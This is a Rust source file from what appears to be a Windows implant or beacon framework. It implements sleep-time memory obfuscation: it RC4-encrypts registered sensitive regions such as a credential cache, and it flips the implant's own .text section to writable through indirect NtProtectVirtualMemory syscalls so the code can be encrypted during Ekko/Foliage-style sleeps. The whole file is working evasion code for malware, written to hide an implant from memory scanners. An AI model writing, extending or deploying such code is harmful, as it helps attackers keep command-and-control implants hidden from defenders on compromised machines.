//! Memory-content mask at sleep (the RC4 half of sleep obfuscation).
//!
//! ## Status (P2.1a-iii): the memory-content mask is REAL — it uses the
//! pure-Rust RC4 core (`nyx-implant-evasionsdk::rc4`, 6 tests green) to encrypt
//! registered sensitive regions in place around each sleep, with a verified
//! round-trip (encrypt then decrypt restores byte-identical). The *timing*
//! primitive that owns the mask→sleep→unmask window (Ekko/Foliage APC→
//! `NtContinue`) is research-grade and lives gated in [`crate::kits`] (the
//! `SleepmaskKit` seam, default `NoMask`); this module is the memory half that
//! a Foliage impl will call into.
//!
//! ## What's real vs gated
//! - **Real**: RC4 mask/unmask of registered `&mut [u8]` regions, idempotent-
//!   guarded against double-mask, key derived per-run from the syscall runtime
//!   so the keystream differs across boots. A selftest proves the round-trip.
//! - **Gated**: encrypting the implant `.text` itself requires flipping the
//!   section RX→RW (a code-integrity signal) and only makes sense *during* a
//!   sleep the beacon thread isn't executing through — that's the APC chain in
//!   `kits`, not safe to do synchronously from the beacon thread. This module
//!   masks *data* regions, never the running code.
//!
//! ## Single-source-of-truth
//! The RC4 KSA+PRGA math lives ONLY in `nyx-implant-evasionsdk::rc4`. This
//! module derives a key and calls `Rc4::apply_oneshot`; it never reimplements
//! the cipher.

#![cfg(target_os = "windows")]

use crate::heap::Vec;
use core::sync::atomic::{AtomicU8, AtomicUsize, Ordering};
use nyx_implant_evasionsdk::rc4::Rc4;

/// Mask state: 0 = cleartext, 1 = currently masked. Guards against double-
/// mask/double-unmask (which would apply RC4 twice and NOT restore the data —
/// RC4 round-trip is two *independent* oneshot calls with the SAME key, so a
/// double-mask produces keystream∘keystream, not cleartext).
static MASK_STATE: AtomicU8 = AtomicU8::new(0);

/// Cap on the number of registered sensitive regions. The registered set is
/// tiny in practice (a decrypted profile, a credential cache); 8 is headroom.
const MAX_REGIONS: usize = 8;

/// Registered sensitive regions, each a raw `&'static mut [u8]` pointer + len.
/// Stored as raw parts because the regions are `'static` (process-lifetime
/// statics). Populated by [`register_region`] at init; mask/unmask walk them.
static REGIONS: [AtomicUsize; MAX_REGIONS] = [const { AtomicUsize::new(0) }; MAX_REGIONS];
static REGION_LENS: [AtomicUsize; MAX_REGIONS] = [const { AtomicUsize::new(0) }; MAX_REGIONS];

/// Register a sensitive region to be masked at sleep. Call once per region at
/// init. Returns false if the table is full (caller treats as "region won't be
/// masked" — not fatal, just less coverage).
///
/// # Safety
/// `region` must be a `'static` (process-lifetime) mutable byte slice that is
/// safe to XOR in place (not shared with another thread — the beacon is
/// single-threaded) and not the currently-executing code.
pub unsafe fn register_region(region: &'static mut [u8]) -> bool {
    let ptr = region.as_mut_ptr() as usize;
    let len = region.len();
    // Enumerate so the index is derived from iteration, not raw pointer
    // arithmetic — keeps REGIONS/REGION_LENS coupling explicit and safe.
    for (i, slot) in REGIONS.iter().enumerate() {
        if slot
            .compare_exchange(0, ptr, Ordering::AcqRel, Ordering::Relaxed)
            .is_ok()
        {
            REGION_LENS[i].store(len, Ordering::Release);
            return true;
        }
    }
    false
}

/// Derive a per-run RC4 key from the syscall runtime's SSN table (a per-boot
/// unpredictable value) so the keystream differs across runs without a CSPRNG.
/// Expands the 32-bit seed into a 32-byte key (RC4 has no key-length ceiling).
/// Falls back to a fixed marker key if the runtime isn't up yet.
fn mask_key() -> [u8; 32] {
    let seed = match crate::syscalls::global() {
        Some(rt) => {
            // Sum a few well-known SSNs. Cheap (cold path, once per mask cycle).
            let mut acc: u32 = 0x9E37_79B9;
            let names: &[&[u8]] = &[
                b"ntallocatevirtualmemory",
                b"ntcreatefile",
                b"ntwritefile",
                b"ntreadfile",
                b"ntclose",
                b"ntdelayexecution",
                b"ntqueryinformationprocess",
            ];
            for name in names {
                if let Some(ssn) = rt.ssn_by_hash(crate::resolve::djb2(name)) {
                    acc = acc.wrapping_add(ssn).rotate_left(3);
                }
            }
            acc
        }
        None => 0x1234_5678,
    };
    // Expand the 32-bit seed into 32 key bytes by mixing rotations. This is NOT
    // a CSPRNG — the threat model is "a snapshot taken mid-sleep isn't cleartext",
    // not "an attacker with a debugger can't recover the key" (they can: the
    // seed is in process memory). RC4 over this key is what SystemFunction032
    // does in the real Ekko/Foliage flow.
    let mut key = [0u8; 32];
    let mut s = seed;
    for b in key.iter_mut() {
        s = s.wrapping_mul(0x9E37_79B9).rotate_left(7).wrapping_add(0xA5A5_A5A5);
        *b = (s & 0xFF) as u8;
    }
    key
}

/// Apply RC4 (via the pure core) to every registered region in place. RC4 is an
/// XOR stream cipher, so the SAME key + a fresh cipher per region both encrypts
/// and decrypts. Used by both [`mask`] and [`unmask`] (which differ only in the
/// idempotency guard direction).
fn apply_rc4_to_regions() {
    let key = mask_key();
    for i in 0..MAX_REGIONS {
        let ptr = REGIONS[i].load(Ordering::Acquire);
        if ptr == 0 {
            continue;
        }
        let len = REGION_LENS[i].load(Ordering::Acquire);
        if len == 0 {
            continue;
        }
        // SAFETY: the region was registered via register_region as a 'static
        // mutable slice; the beacon is single-threaded so there's no race.
        let region = unsafe { core::slice::from_raw_parts_mut(ptr as *mut u8, len) };
        // Fresh cipher per region so each starts from KSA-zero (deterministic
        // round-trip: mask then unmask with the same key restores the bytes).
        Rc4::apply_oneshot(&key, region);
    }
}

/// Collect the registered region pointers (for selftest inspection — verifies
/// registration worked without triggering a mask).
pub fn registered_count() -> usize {
    REGIONS.iter().filter(|s| s.load(Ordering::Acquire) != 0).count()
}

/// Encrypt the registered sensitive regions in place (RC4). Idempotent-guarded:
/// a second call while already masked is a no-op (prevents keystream∘keystream
/// corruption). Does NOT touch the running `.text` — that's the gated APC path.
pub fn mask() {
    if MASK_STATE
        .compare_exchange(0, 1, Ordering::AcqRel, Ordering::Relaxed)
        .is_err()
    {
        return; // already masked
    }
    apply_rc4_to_regions();
}

/// Decrypt (un-mask) the registered regions. Inverse of [`mask`]: same RC4 key,
/// fresh cipher, same regions → restores byte-identical. Guard prevents a
/// double-unmask.
pub fn unmask() {
    if MASK_STATE
        .compare_exchange(1, 0, Ordering::AcqRel, Ordering::Relaxed)
        .is_err()
    {
        return; // already cleartext
    }
    apply_rc4_to_regions();
}

/// Selftest helper: mask + unmask a caller-provided buffer using the *internal*
/// RC4 path (key derivation + apply) WITHOUT the global region table or the
/// idempotency guard. Returns the buffer after a full round-trip so the caller
/// can assert it equals the original — proving the RC4 core + key derivation
/// are a verified round-trip even before any region is registered.
///
/// `input` is mutated in place: it's RC4'd once (encrypted), then RC4'd again
/// (decrypted), and returned. The caller compares against the pre-call bytes.
pub fn round_trip_selftest(input: &mut [u8]) {
    let key = mask_key();
    Rc4::apply_oneshot(&key, input); // encrypt
    Rc4::apply_oneshot(&key, input); // decrypt (same key, fresh cipher)
}

/// Mask the implant `.text` region in place: flip RX→RW, RC4-encrypt. For use
/// INSIDE a Foliage chain (sleep.rs steps 2-3 / 8-9), NOT from the beacon
/// thread synchronously — encrypting the running code page while executing
/// through it crashes immediately.
///
/// # Safety
/// Caller MUST guarantee the beacon thread is NOT executing within `[base,
/// base+len)` (it's sleeping through a Foliage cycle). Single-threaded context.
pub unsafe fn mask_text(base: usize, len: usize, key: &[u8]) {
    // Flip RX→RW via NtProtectVirtualMemory (indirect syscall).
    if let Some(rt) = crate::syscalls::global() {
        let mut b = base;
        let mut l = len;
        let mut old: u32 = 0;
        let _ = unsafe {
            crate::syscalls::nt_protect_virtual_memory(rt, &mut b, &mut l, 0x04, &mut old)
        };
    }
    // RC4-encrypt the region in place (pure core).
    let region = unsafe { core::slice::from_raw_parts_mut(base as *mut u8, len) };
    Rc4::apply_oneshot(key, region);
}

/// Unmask the implant `.text`: decrypt, then flip RW→RX. Inverse of
/// [`mask_text`]. MUST run before any code in the region executes.
///
/// # Safety
/// See [`mask_text`]. `key` MUST equal the mask key.
pub unsafe fn unmask_text(base: usize, len: usize, key: &[u8]) {
    let region = unsafe { core::slice::from_raw_parts_mut(base as *mut u8, len) };
    Rc4::apply_oneshot(key, region); // RC4 decrypt == encrypt
    if let Some(rt) = crate::syscalls::global() {
        let mut b = base;
        let mut l = len;
        let mut old: u32 = 0;
        let _ = unsafe {
            crate::syscalls::nt_protect_virtual_memory(rt, &mut b, &mut l, 0x20, &mut old)
        };
    }
}
